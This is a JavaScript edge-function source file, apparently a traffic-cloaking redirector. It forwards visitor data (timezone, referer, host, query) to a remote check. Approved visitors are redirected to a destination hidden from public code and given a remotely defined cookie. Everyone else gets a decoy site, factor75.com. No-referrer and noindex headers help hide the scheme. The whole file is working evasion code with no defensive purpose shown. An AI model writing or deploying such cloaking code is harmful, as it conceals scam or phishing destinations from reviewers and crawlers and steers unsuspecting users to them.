/**
 * Final exit. Destination comes only from the remote check response body.
 * Never embedded in public HTML/JS.
 */
import { remoteFlag, edgeRoute } from "../_lib/remote.js";

const SAFE_URL = "https://factor75.com";

function redirect(url, extraHeaders) {
  return new Response(null, {
    status: 302,
    headers: {
      Location: url,
      "Cache-Control": "no-store, no-cache, must-revalidate",
      "Referrer-Policy": "no-referrer",
      "X-Robots-Tag": "noindex, nofollow, noarchive, nosnippet, noimageindex",
      ...(extraHeaders || {}),
    },
  });
}

export async function onRequestGet(context) {
  const { request, env } = context;
  const ua = request.headers.get("user-agent") || "";
  const url = new URL(request.url);

  const payload = {
    tz: url.searchParams.get("tz") || "",
    he: "",
    rui: url.searchParams.get("rui") || "/api/go",
    qu: url.searchParams.get("qu") || "",
    r: request.headers.get("referer") || "",
    sn: request.headers.get("host") || "1min.to",
    co: "",
  };

  try {
    const remote = await remoteFlag(request, env, payload);
    if (remote.ok && remote.flag === "true" && remote.dest) {
      let dest = remote.dest;
      if (!/^https?:\/\//i.test(dest)) {
        dest = "https://" + dest.replace(/^\/+/, "");
      }
      const q = payload.qu;
      if (q) dest += (dest.includes("?") ? "&" : "?") + q;
      const headers = {};
      const parts = remote.parts || [];
      if (parts[7] && parts[8]) {
        const days = parseInt(parts[9], 10);
        const maxAge = (Number.isFinite(days) ? days : 1) * 86400;
        headers[
          "Set-Cookie"
        ] = `${parts[7]}=${parts[8]}; Path=/; Max-Age=${maxAge}; SameSite=Lax`;
      }
      return redirect(dest, headers);
    }
    if (remote.ok && remote.flag === "false") {
      if (remote.dest && /^https?:\/\//i.test(remote.dest)) {
        return redirect(remote.dest);
      }
      return redirect(SAFE_URL);
    }
  } catch {
    /* fall through */
  }

  return redirect(SAFE_URL);
}

export async function onRequestHead(context) {
  return onRequestGet(context);
}
